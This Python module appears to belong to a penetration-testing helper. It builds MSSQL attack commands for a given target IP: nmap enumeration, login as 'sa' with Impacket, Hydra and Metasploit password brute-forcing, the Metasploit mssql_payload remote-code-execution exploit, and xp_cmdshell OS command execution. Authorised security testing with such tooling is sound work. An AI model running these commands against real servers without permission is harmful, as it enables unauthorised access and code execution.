from Modules.Imports.protocol_imports import *

def check_open_instances(target_ip, open_ports):
    title = "Check for Open MSSQL Instances"
    content = f"nmap -p 1433 --script ms-sql-info {target_ip}"
    run_command(title, content, target_ip, open_ports)

def list_databases(target_ip, open_ports):
    title = "List MSSQL Databases"
    content = (
        f"Use `sqsh` or `mssqlclient.py` from Impacket:\n\n"
        f"1. Connect: mssqlclient.py sa@{target_ip} -windows-auth\n"
        f"2. Run: SELECT name FROM sys.databases;\n"
        f"3. Or use: sqsh -S {target_ip} -U sa -P <password>\n"
    )
    run_command(title, content, target_ip, open_ports)

def execute_sql_query(target_ip, open_ports):
    title = "Execute SQL Query"
    content = (
        f"Use `sqsh` or `mssqlclient.py` to execute queries:\n\n"
        f"Example:\n"
        f"mssqlclient.py sa@{target_ip} -windows-auth\n"
        f"SQL: SELECT @@version;"
    )
    run_command(title, content, target_ip, open_ports)

def brute_force_login(target_ip, open_ports):
    title = "Brute-force MSSQL Login"
    content = (
        f"Use `hydra` or `msfconsole`:\n\n"
        f"Hydra Example:\n"
        f"hydra -L users.txt -P passwords.txt {target_ip} mssql\n\n"
        f"Metasploit Example:\n"
        f"msfconsole -q\n"
        f"use auxiliary/scanner/mssql/mssql_login\n"
        f"set RHOSTS {target_ip}\n"
        f"run"
    )
    run_command(title, content, target_ip, open_ports)

def test_rce_exploit(target_ip, open_ports):
    title = "Test for MSSQL RCE Exploit"
    content = (
        f"Use Metasploit or manual techniques for RCE:\n\n"
        f"Metasploit Example:\n"
        f"msfconsole -q\n"
        f"search mssql\n"
        f"use exploit/windows/mssql/mssql_payload\n"
        f"set RHOSTS {target_ip}\n"
        f"run\n\n"
        f"Manual Example:\n"
        f"xp_cmdshell 'whoami'; -- Execute OS commands from SQL"
    )
    run_command(title, content, target_ip, open_ports)
